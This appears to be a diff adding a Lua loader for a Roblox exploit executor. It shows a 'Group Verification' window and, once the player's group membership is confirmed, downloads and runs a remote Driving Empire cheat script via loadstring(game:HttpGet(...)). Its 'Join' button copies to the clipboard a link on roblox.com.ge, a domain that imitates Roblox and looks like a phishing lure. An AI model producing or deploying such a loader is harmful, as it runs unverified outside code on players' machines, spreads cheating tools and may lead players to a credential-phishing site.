@@ -1,0 +1,151 @@
+-- [[ CONFIGURATION ]] --
+-- Masukkan URL Grup Roblox kamu di bawah ini (Format link bebas, ID akan terdeteksi otomatis):
+local GROUP_URL = "https://roblox.com.ge/communities/8692078709/"
+local SCRIPT_URL = "https://rawscripts.net/raw/VOLVO-Driving-Empire-Car-RacingRP-Axonic-Keyless-244038"
+
+-- [[ AUTO-EXTRACT GROUP ID ]] --
+local function extractGroupId(url)
+    local groupId = url:match("/groups/(%d+)") or url:match("(%d+)")
+    return tonumber(groupId)
+end
+
+local GROUP_ID = extractGroupId(GROUP_URL)
+
+-- [[ SERVICES ]] --
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
+
+-- [[ UI GENERATOR ]] --
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "GroupVerifyUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 350, 0, 220)
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -110)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+MainFrame.BorderSizePixel = 0
+MainFrame.ClipsDescendants = true
+MainFrame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Position = UDim2.new(0, 0, 0, 10)
+Title.BackgroundTransparency = 1
+Title.Text = "Group Verification"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 20
+Title.Font = Enum.Font.GothamBold
+Title.Parent = MainFrame
+
+local SubTitle = Instance.new("TextLabel")
+SubTitle.Size = UDim2.new(1, -40, 0, 30)
+SubTitle.Position = UDim2.new(0, 20, 0, 45)
+SubTitle.BackgroundTransparency = 1
+SubTitle.Text = "Gabung grup kami terlebih dahulu untuk menggunakan script ini!"
+SubTitle.TextColor3 = Color3.fromRGB(180, 180, 180)
+SubTitle.TextSize = 12
+SubTitle.TextWrapped = true
+SubTitle.Font = Enum.Font.Gotham
+SubTitle.Parent = MainFrame
+
+-- Tombol Join Group
+local JoinBtn = Instance.new("TextButton")
+JoinBtn.Name = "JoinBtn"
+JoinBtn.Size = UDim2.new(0, 270, 0, 40)
+JoinBtn.Position = UDim2.new(0.5, -135, 0, 90)
+JoinBtn.BackgroundColor3 = Color3.fromRGB(45, 120, 240)
+JoinBtn.Text = "🔗 Join Roblox Group"
+JoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+JoinBtn.TextSize = 14
+JoinBtn.Font = Enum.Font.GothamBold
+JoinBtn.Parent = MainFrame
+
+local JoinCorner = Instance.new("UICorner")
+JoinCorner.CornerRadius = UDim.new(0, 8)
+JoinCorner.Parent = JoinBtn
+
+-- Tombol Verify
+local VerifyBtn = Instance.new("TextButton")
+VerifyBtn.Name = "VerifyBtn"
+VerifyBtn.Size = UDim2.new(0, 270, 0, 40)
+VerifyBtn.Position = UDim2.new(0.5, -135, 0, 145)
+VerifyBtn.BackgroundColor3 = Color3.fromRGB(40, 180, 100)
+VerifyBtn.Text = "✓ Verify & Execute"
+VerifyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+VerifyBtn.TextSize = 14
+VerifyBtn.Font = Enum.Font.GothamBold
+VerifyBtn.Parent = MainFrame
+
+local VerifyCorner = Instance.new("UICorner")
+VerifyCorner.CornerRadius = UDim.new(0, 8)
+VerifyCorner.Parent = VerifyBtn
+
+-- [[ LOGIC & FUNCTIONS ]] --
+
+-- Fungsi Copy Link Group
+JoinBtn.MouseButton1Click:Connect(function()
+    setclipboard(GROUP_URL)
+    
+    StarterGui:SetCore("SendNotification", {
+        Title = "Link Tersalin!",
+        Text = "Link grup telah disalin ke clipboard Anda.",
+        Duration = 3
+    })
+end)
+
+-- Fungsi Eksekusi Script Utama
+local function loadMainScript()
+    VerifyBtn.Text = "Loading Script..."
+    task.wait(1)
+    
+    local tween = TweenService:Create(MainFrame, TweenInfo.new(0.5), {Size = UDim2.new(0, 0, 0, 0)})
+    tween:Play()
+    tween.Completed:Wait()
+    ScreenGui:Destroy()
+    
+    loadstring(game:HttpGet(SCRIPT_URL))()
+end
+
+-- Fungsi Verifikasi Status Member
+VerifyBtn.MouseButton1Click:Connect(function()
+    if not GROUP_ID then
+        VerifyBtn.Text = "URL Grup Tidak Valid!"
+        VerifyBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+        return
+    end
+
+    VerifyBtn.Text = "Checking..."
+    task.wait(0.5)
+    
+    local success, isInGroup = pcall(function()
+        return LocalPlayer:IsInGroup(GROUP_ID)
+    end)
+    
+    if success and isInGroup then
+        VerifyBtn.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
+        VerifyBtn.Text = "Verified! Loading..."
+        loadMainScript()
+    else
+        VerifyBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+        VerifyBtn.Text = "Belum Join! Coba Lagi"
+        
+        StarterGui:SetCore("SendNotification", {
+            Title = "Verifikasi Gagal",
+            Text = "Anda belum bergabung ke dalam grup!",
+            Duration = 3
+        })
+        
+        task.wait(2)
+        VerifyBtn.BackgroundColor3 = Color3.fromRGB(40, 180, 100)
+        VerifyBtn.Text = "✓ Verify & Execute"
+    end
+end)
